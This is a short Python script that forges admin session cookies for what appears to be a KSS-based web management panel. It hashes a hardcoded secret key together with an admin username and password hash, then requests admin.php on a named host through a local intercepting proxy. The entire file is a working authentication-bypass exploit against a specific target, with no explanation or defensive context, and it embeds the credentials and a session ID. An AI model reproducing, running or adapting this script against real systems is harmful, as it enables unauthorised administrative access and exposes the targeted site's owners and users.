import hashlib
import requests
proxies={"http":"127.0.0.1:8080"}
COOKKEY="XIpCcfoe_y43"
admin_passwd_md5="8ccf03839a8c63a3a9de17fa5ac6a192"
target_url="http://guaika.txmeili.com:8888/kss_admin/admin.php"
username="axing"
cookie_kss_manager= "1,axing,8ccf03839a8c63a3a9de17fa5ac6a192,efefefef"
cookie_kss_manager_ver=hashlib.md5(cookie_kss_manager + COOKKEY).hexdigest()

cookie_kss_mmlogin= hashlib.md5(username + admin_passwd_md5).hexdigest()
cookie_kss_mmlogin_ver=hashlib.md5(cookie_kss_mmlogin + COOKKEY).hexdigest()
print(cookie_kss_mmlogin_ver)
cookies={"kss_manager":cookie_kss_manager,"kss_manager_ver":cookie_kss_manager_ver,"kss_mmlogin":cookie_kss_mmlogin,"kss_mmlogin_ver":cookie_kss_mmlogin_ver,"PHPSESSID":"co6scetk0r27a8cn9oheqas2h3"}
response=requests.get(target_url,cookies=cookies,proxies=proxies)
print(response.content)